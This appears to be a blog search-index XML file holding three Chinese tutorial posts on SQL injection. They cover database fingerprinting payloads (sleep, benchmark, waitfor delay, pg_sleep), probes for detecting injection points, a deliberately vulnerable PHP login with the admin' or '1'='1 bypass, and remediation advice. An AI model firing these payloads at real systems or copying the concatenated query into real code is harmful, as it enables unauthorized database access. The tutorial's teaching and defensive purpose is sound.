<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>sql注入数据库识别</title>
      <link href="/blog/sql%E6%B3%A8%E5%85%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%86%E5%88%AB/"/>
      <url>/blog/sql%E6%B3%A8%E5%85%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AF%86%E5%88%AB/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>确认注入点后，我们需要识别后端所使用的数据库，因为不同的数据库注入的方式不一样，后期利用手法和条件也不一样。</p><div class="note purple no-icon flat"><p>核心就是利用数据库<strong>特有的一些语法或者时函数</strong>来判断即可，毕竟要满足该数据库的语法后SQL语句才能正常执行；下面的例子不全面，只是给大家提供一个思路，最明显的就是<strong>休眠函数</strong></p></div><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><table><thead><tr><th>描述</th><th>语句</th></tr></thead><tbody><tr><td>sleep函数</td><td>1’-sleep(1)&#x3D;0 limit 1 –</td></tr><tr><td>banchmark函数</td><td>1’-banchmark(5000000,encode(‘Slow Down’,’by 5 seconds’))&#x3D;0 limit 1 –</td></tr><tr><td>字符串连接</td><td>id&#x3D;’ ‘mysql’ –<br>id&#x3D;’ and concat(‘some’,’string’)</td></tr><tr><td>版本信息</td><td>select @@version<br>select version()</td></tr><tr><td>错误消息</td><td>id&#x3D;’<br></td></tr><tr><td>特有函数</td><td>select connection_id()<br>select last_insert_id<br>select row_count()</td></tr></tbody></table><h1 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h1><table><thead><tr><th>描述</th><th>语句</th></tr></thead><tbody><tr><td>字符串连接</td><td>id&#x3D;’ ‘oracle’ –a&#96;</td></tr><tr><td>默认表</td><td>id&#x3D;’union select 1 from v$version – <br>select banner from v$version<br>select banner from v$version where rownum&#x3D;1</td></tr><tr><td>错误消息</td><td>id&#x3D;’</td></tr></tbody></table><h1 id="MSSQL"><a href="#MSSQL" class="headerlink" title="MSSQL"></a>MSSQL</h1><table><thead><tr><th>描述</th><th>语句</th></tr></thead><tbody><tr><td>waitfor函数</td><td>‘;waitfor delay ‘00:00:10’; –</td></tr><tr><td>堆叠查询默认变量</td><td>sql’;select @@servername –</td></tr><tr><td>错误消息</td><td>id&#x3D;’</td></tr><tr><td>错误消息（id整数，@@servername转换错误）</td><td>id&#x3D;@@servername<br>id&#x3D;0&#x2F;@@servername</td></tr><tr><td>常量</td><td>@@pack_received<br>@@rowcount</td></tr></tbody></table><h1 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h1><table><thead><tr><th>描述</th><th>语句</th></tr></thead><tbody><tr><td>字符串连接</td><td>id&#x3D;’ ‘postgresql’ –a</td></tr><tr><td>休眠函数</td><td>id&#x3D;’ and (select pg_sleep_for(‘5 sec’)) is null – a</td></tr></tbody></table><h1 id="一些经验"><a href="#一些经验" class="headerlink" title="一些经验"></a>一些经验</h1><table><thead><tr><th>方法</th><th>数据库</th></tr></thead><tbody><tr><td>常用搭配</td><td>asp &#x3D;&gt; mssql、access<br>aspx &#x3D;&gt; mssql<br>php &#x3D;&gt; mysql\postgresql<br>java &#x3D;&gt; mysql、oracle、mssql</td></tr><tr><td>默认端口</td><td>oracle &#x3D;&gt; 1521<br>mssql &#x3D;&gt; 1433<br>mysql &#x3D;&gt; 3306<br>postgresql &#x3D;&gt; 5432</td></tr><tr><td>数据库特有函数</td><td>pg_sleep() &#x3D;&gt; postgresql<br>benchmark &#x3D;&gt; mysql<br>waitfor delay &#x3D;&gt; mssql<br>dbms_pipe.receive_message() &#x3D;&gt; oracle</td></tr><tr><td>特殊符号</td><td>；&#x3D;&gt; postgresql、mssql默认可堆叠查询<br># &#x3D;&gt; MySQL注释符</td></tr></tbody></table><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入点检测</title>
      <link href="/blog/sql%E6%B3%A8%E5%85%A5%E7%82%B9%E6%A3%80%E6%B5%8B/"/>
      <url>/blog/sql%E6%B3%A8%E5%85%A5%E7%82%B9%E6%A3%80%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>挖掘SQL注入漏洞的第一步，就是发现SQL注入漏洞，只有发现了注入点才能够继续深入利用。</p><p>可以通过多种方式来检测是否存在注入，最简单的就是直接在参数后面加上<mark style="background: #FFB8EBA6;">‘</mark> 或者<mark style="background: #D2B3FFA6;">“</mark>等特殊字符让web应用程序抛出异常；但这种情况已经很少见了，比较好的方法是通过盲注来进行判断；</p><h1 id="注入点位置"><a href="#注入点位置" class="headerlink" title="注入点位置"></a>注入点位置</h1><p>所有和数据库有交互的地方均可能存在SQL注入，因此我们在分析数据包的时候， 可以关注一下哪些数据可能会和数据库交互，从而进行测试是否存在SQL注入漏洞。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /?<span class="built_in">id</span>=homePage* HTTP/<span class="number">1.1</span></span><br><span class="line">Host: www.netspi.com*</span><br><span class="line">Connection: close</span><br><span class="line">Cache-Control: <span class="built_in">max</span>-age=<span class="number">0</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">62.0</span><span class="number">.3202</span><span class="number">.94</span> Safari/<span class="number">537.36</span>*</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,image/apng,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=<span class="number">0.9</span></span><br><span class="line">X-Server-Name: PROD*</span><br><span class="line">Cookie: user=harold;*</span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">username=harold*&amp;email=harold@netspi.com*</span><br></pre></td></tr></table></figure><blockquote><p>如果传输的是json格式的数据，在使用双引号闭合时，记得使用\来防止破坏json数据结构，如下，其他特殊结构数据类似<br>{“username”:”test&quot;“}</p></blockquote><h1 id="注入检测"><a href="#注入检测" class="headerlink" title="注入检测"></a>注入检测</h1><p>检测是否存在注入一般通过两种方式来判断：</p><ol><li>输入特殊字符是否抛出相关异常</li><li>输入一些语句运行是否达到我们预期的结果（返回内容、响应时间等）</li></ol><table><thead><tr><th>类型</th><th>语句和结果</th></tr></thead><tbody><tr><td>特殊字符</td><td>id&#x3D;’)”)</td></tr><tr><td>逻辑算数测试</td><td>id&#x3D;’ and 2*3&#x3D;6 – true<br>id&#x3D;’ and 2*3&#x3D;5 – false<br>id&#x3D;2*3 是否返回id&#x3D;6内容<br>id&#x3D;1&#x2F;1 true<br>id&#x3D;1&#x2F;0 false</td></tr><tr><td>返回延时</td><td>id&#x3D; ‘ and sleep(5) 延迟5秒或更久</td></tr></tbody></table><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入</title>
      <link href="/blog/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/blog/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SQL注入是发生于应用程序与数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，在设计不良的程序当中忽略了字符检查，那么这些注入进去的恶意指令就会被数据库服务器误认为是正常的SQL指令而执行，因此遭到破坏或是入侵。</p><h1 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h1><p>SQL注入漏洞产生的原因是网站应用程序在编写时未对用户提交至服务器的数据进行合法性校验（类型、长度、业务参数合法性、敏感字符等），同时没有对用户输入数据进行有效地特殊字符过滤，使得用户的输入直接带入数据库进行执行，超出了SQL语句原来设计的预期结果，导致了SQL注入漏洞。</p><h1 id="注入举例"><a href="#注入举例" class="headerlink" title="注入举例"></a>注入举例</h1><p>以下代码为模拟web应用程序进行登录炒作。若登录成功返回success，失败则返回fail</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from users where username = &#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$rs</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$rs</span>-&gt;<span class="title function_ invoke__">fetch_row</span>())&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;fail&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用户名<mark class="hl-label blue">username</mark> 和密码<mark class="hl-label green">password</mark> 均来之用户的直接传入，无任何过滤，后直接拼接到SQL语句中。<br>正常用户登录时，SQL语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;password&#x27;</span></span><br></pre></td></tr></table></figure><p>攻击者尝试登录，输入用户名<mark class="hl-label pink">admin’ or '1'='1</mark> ,输入密码123，因为是直接拼接，所以构造出的sql语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure><p>此时因为sql语句中存在or ‘1’&#x3D;‘1’，所以永为真，将会查询出所有的结果，也就会登录成功返回success。(也就是万能密码)</p><h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p><strong>SQL注入漏洞可能出现在一切数据库交互的地方，常见举例如下：</strong></p><blockquote><p>简而言之：所有和数据库交互的点均可能存在SQL注入</p></blockquote><table><thead><tr><th align="left">关键字</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">增</td><td align="left">注册新用户、创建订单、添加文章……</td></tr><tr><td align="left">删</td><td align="left">删除用户、删除订单……</td></tr><tr><td align="left">改</td><td align="left">修改订单、更新用户信息……</td></tr><tr><td align="left">查</td><td align="left">查询信息、筛选订单、搜索文章……</td></tr></tbody></table><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><ol><li>获取数据库访问权限，甚至获得DBA权限，从而获取数据库中所有数据，造成信息泄露；（可获取数据）</li><li>对数据库进行增删改操作，例如删除数据库中重要数据库的表（可进行增删改操作）</li><li>通过构造特殊的数据库语句，可操作数据库进入后台或插入木马，以获取整个网站和数据库的控制权限，篡改网页，发布不良信息等。（可获取网站权限）</li><li>获取服务器最高权限，远程控制服务器，甚至导致局域网被入侵；（可获取服务器权限）</li></ol><h1 id="通用修复建议"><a href="#通用修复建议" class="headerlink" title="通用修复建议"></a>通用修复建议</h1><h2 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h2><h3 id="输入过滤"><a href="#输入过滤" class="headerlink" title="输入过滤"></a>输入过滤</h3><ol><li>严格控制输入数据的类型；如通过id获取用户信息时，仅允许传入的id为整行</li><li>严格控制输入数据的长度；如限制用户名长度应小于20</li><li>输入合法性判断；禁止出现一些特殊字符或关键词<ul><li>‘ , “ , \ , &lt; , &gt; , &amp; ,* , ; , # , select , from , where, sub , if , union , sleep , and , or 等</li></ul></li><li>对所有可能的输入点进行判断检查，如UA、IP、Cookie等</li></ol><h3 id="预编译SQL语句（参数化查询）"><a href="#预编译SQL语句（参数化查询）" class="headerlink" title="预编译SQL语句（参数化查询）"></a>预编译SQL语句（参数化查询）</h3><p>参数化查询是一种查询类型，其中占位符用于填充参数，参数值在执行时提供。原理是采用了预编译的方法，先将SQL语句中可被用户控制的参数集进行编译，生成对应的变量集，再使用对应的设置方法，为临时变量集里面的元素进行赋值，赋值过程中会对传入的参数进行强制类型检查和安全检查。</p><p>所有与数据库交互的业务接口均采用参数化查询，参数化的语句使用参数而不是将用户输入变量直接嵌入到SQL语句中，参数化查询是防御SQL注入的最佳方法，比如：Java中的<mark class="hl-label purple">PreparedStatement</mark> ，PHP中的<mark class="hl-label blue">PDO</mark> 等。</p><h2 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h2><h3 id="最小权限原则"><a href="#最小权限原则" class="headerlink" title="最小权限原则"></a>最小权限原则</h3><p>遵循最小化权限原则，严格限制网站用户的数据库操作权限，禁止将任何高权限账户（sa，dba，root等）用于应用程序数据库访问，从而最大限度的减少注入攻击对数据库的危害。</p><h3 id="禁用敏感函数"><a href="#禁用敏感函数" class="headerlink" title="禁用敏感函数"></a>禁用敏感函数</h3><p>防止攻击者通过SQL注入获取到除数据库外的其他更高权限，如系统权限等；<br>比如MSSQL中，拒绝用户访问敏感的系统存储过程，如xp_dirtree、xp_xmdshell等。</p><h3 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h3><p>限制用户仅能够访问必须使用的数据库表。</p><h3 id="统一编码"><a href="#统一编码" class="headerlink" title="统一编码"></a>统一编码</h3><p>网站与数据层的编码统一，建议全部使用UTF-8编码，避免上下层编码不一致导致一些过滤模型被绕过，比如宽字节注入等。</p><h2 id="其他层面"><a href="#其他层面" class="headerlink" title="其他层面"></a>其他层面</h2><ol><li>网站应避免抛出SQL语句执行过程中的错误信息，如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断；</li><li>使用通用防注入系统，或部署WAF等。</li></ol><h1 id="TIPS"><a href="#TIPS" class="headerlink" title="TIPS"></a>TIPS</h1><ol><li>在测试SQL注入的时候，一定要思考后端的SQL语句是如何构造的，只有判断除后端SQL语句的大致构造情况，才能知道我们可控注入点的位置，可能是<mark class="hl-label green">select sqli</mark> 、<mark class="hl-label pink">where id=</mark>  、<mark class="hl-label purple">order by sqli</mark> ，这样才好对症下药。</li></ol><hr>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
